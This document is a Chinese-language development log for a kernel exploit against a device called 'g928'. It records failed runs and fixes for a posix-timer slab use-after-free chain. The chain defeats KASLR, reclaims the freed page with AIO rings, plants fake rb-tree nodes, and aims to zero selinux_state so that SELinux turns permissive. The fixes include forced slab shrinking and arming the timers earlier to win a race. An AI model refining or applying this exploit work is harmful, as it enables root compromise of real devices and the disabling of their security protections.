# 6.18.21 g928：multi stream miss 后的 AIO fallback

## 失败日志

```text
[multi] clean local=125 slab=0xffffff88e8bee000 captured=21/1000
[multi] target_victim=0 local=125 slab_count=21
[stream] page_freed=0 pfn=0 order=0 cpu=0
[stream] writes=6144 hit=0
[multi] target page miss; target zombie left unreaped
[selinux] pre-perf attempt 3/4
[task-perf] fork tracepoint id unavailable errno=13
[task] leak failed
FAIL=proof exec_exited
```

KASLR 已成功：

```text
KASLR_SLIDE=0x2240600000
KASLR_ANCHORS=3
KASLR_VOTES=1832
```

失败发生在 **stream 页回收**，因此后续 SELinux 零写失败，perf 在 Enforcing 下返回 EACCES。

## 修复

单 victim 路径本来就有 AIO ring fallback；multi-victim 路径没有。

现在 multi 分支在 `reclaim_stream()` miss 后：

```text
1. 取同一个 target victim
2. 构造 selinux_state-7 target（target 为 0 时）
3. 调用 reclaim_and_plant()
4. 分配 AIO ring，并在所有 ring 的 node_off 处植入 fake rb node
5. 重新 reap target
```

日志新增：

```text
[multi] target slab=... node_pfn=... off=...
[multi] stream miss; trying AIO reclaim target=...
[multi] target reaped via AIO status=...
```

失败时仍保留 target zombie，不 kill/reap：

```text
[multi] target page miss; target zombie left unreaped; cleaning our memory only
```

## 为什么不用 PFN 判定

g928 日志的 pfn：

```text
slab=0xffffff88e8bee000
node_pfn=0x94862a
```

该 pfn 与 16GB 设备的 RAM 范围不一致，说明当前构建的
`(VA - PAGE_OFFSET) >> 12` 不能稳定作为 g928 的物理 PFN oracle。
AIO fallback 走用户映射的 ring，不依赖 pfn 命中；只要 victim 页被任一
AIO ring 拿到，fake node 就会在 ring 用户映射中。

## 风险

- 若 victim 页没有被任何 AIO ring 拿到，plant-all 仍会返回成功，随后 reap
  可能触发错误页面；这比 stream miss 直接停止更激进。
- 仍需 g928 真机验证；失败后必须重启，不要强杀 parked plant。
- `detect_memstart_pfn()` 现在会打印 `/proc/iomem` 诊断，但尚未把
  `memstart_addr` 用作 pfn 修正；后续根据新日志再决定是否切换 PAGE_OFFSET
  推导。

## 第二次日志：AIO 已执行但未命中

```text
[multi] target slab=0xffffff8b1d114000 node_pfn=0xb1d114 off=0xe60
[stream] page_freed=0
[multi] stream miss; trying AIO reclaim victim=0xffffff8b1d114d80 off=0xe60
[aio] plant-all rings=4096 planted=4096 off=0xe60 target=0xffffffeb23b9a6e9
[multi] target reaped via AIO status=9
```

AIO 4096 个 ring 全部植入，但：

- 没有 `[selinux]` tile 日志；
- 没有 permissive；
- target 仍以 SIGKILL 状态被 reap；
- 说明 victim 页还没有回到 buddy，AIO 不可能拿到。

因此增加：

```text
force_slab_release()
  /sys/kernel/slab/posix_timers_cache/shrink
  /sys/kernel/slab/:0000256/shrink
  /sys/kernel/slab/cred_jar/shrink
  /proc/sys/vm/drop_caches = 3
  sleep 250ms
```

在 stream miss 后、AIO reclaim 前执行。日志：

```text
[slab-shrink] ...
[slab-shrink] paths=N
```

## 仍然存在的根因

两次日志的 slab 地址分别是：

```text
0xffffff88e8bee000  -> pfn 0x94862a
0xffffff8b1d114000  -> pfn 0xb1d114
```

都落在当前构建 `(VA - 0xffffff8000000000) >> 12` 计算出的
明显超出 RAM 的 pfn。说明 g928 的 slab 虚拟地址不是当前静态
`PAGE_OFFSET` 能直接换算的 direct-map alias，可能是：

- 运行时 linear-map 基址随机化；
- vmalloc/slab virtual alias；
- 或 tracepoint 返回的对象地址经过了额外的虚拟化/标记。

仅靠 AIO 只能绕过 pfn oracle，不能解决“页没释放”；
`force_slab_release` 是下一步验证点。

## BRM 对比：漏掉的 arm 时序

BRM 的 `exec_fn` 在创建第 1024 个 timer 时立刻：

```c
timer_settime(armed, 0, &spec, NULL);
```

我们的 multi 版本原来是在 phase4 后、根据捕获索引再 arm：

```text
exec 线程被 killer 提前 SIGKILL
→ arm_idx 仍为 -1
→ 定时器没有 timerqueue 节点
→ 即使页回收成功也不会有 rb_erase 写
```

第二次日志正好是：

```text
[multi] victim 0 zombie=1 code=2 status=9
[exec] armed -1/-1/-1
```

目标 victim 在 arm 前被杀，所以后续 AIO 4096 rings 全部无效。

修复后：

```text
timer_create(SIGEV_SIGNAL)
→ timer_settime 立即武装
→ 再发布 g_exec_tid / phase3
```

这样 killer 只能在 timer 已经进入 timerqueue 之后杀进程。
同时不再依赖“trace 捕获索引 == timer 创建索引”；所有 timer 都武装。


